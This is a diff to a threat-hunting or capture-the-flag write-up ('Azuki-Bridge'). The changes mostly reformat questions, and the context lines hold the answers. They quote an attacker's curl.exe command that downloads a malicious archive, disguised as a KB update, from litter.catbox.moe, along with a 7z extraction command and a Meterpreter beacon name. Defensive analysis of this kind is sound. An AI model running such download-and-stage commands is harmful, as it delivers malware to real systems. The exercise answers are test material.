@@ -54,7 +54,7 @@ Result:
 
   ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B0.png)
 
-*Question:* Identify the source IP address for lateral movement to the admin PC?
+*Question: Identify the source IP address for lateral movement to the admin PC?*
 
 ```
 10.1.0.204
@@ -77,7 +77,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B1.png)
 
-*Question:* Identify the compromised account used for lateral movement?
+*Question: Identify the compromised account used for lateral movement?*
 
 ```
 yuki.tanaka
@@ -101,7 +101,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B1.png)
 
-Question: What is the target device name?
+*Question: What is the target device name?*
 
 ```
 azuki-adminpc
@@ -162,7 +162,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B4.png)
 
-Question: What file hosting service was used to stage malware?
+*Question: What file hosting service was used to stage malware?*
 
 ```
 litter.catbox.moe
@@ -173,6 +173,7 @@ litter.catbox.moe
 
 Command-line download utilities provide flexible, scriptable malware delivery while blending with legitimate administrative activity.
 
+The query used is the same as the previous flag.
 
 Query Used: 
 
@@ -188,7 +189,7 @@ Result
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B5.png)
 
-Question: What command was used to download the malicious archive?
+*Question: What command was used to download the malicious archive?*
 
 ```
 "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
@@ -259,7 +260,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B6.png)
 
-Question: Identify the command used to extract the password-protected archive?
+*Question: Identify the command used to extract the password-protected archive?*
 
 ```
 "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y
@@ -332,7 +333,7 @@ Result:
 
 ![image alt](https://github.com/Muts256/SNC-Public/blob/e8ddfdba6abe0d2b491f182bb2b1297adcdb3517/Images/Azuki-Bridge/B7.png)
 
-Question: Identify the C2 beacon filename?
+*Question: Identify the C2 beacon filename?*
 
 ```
 meterpreter.exe
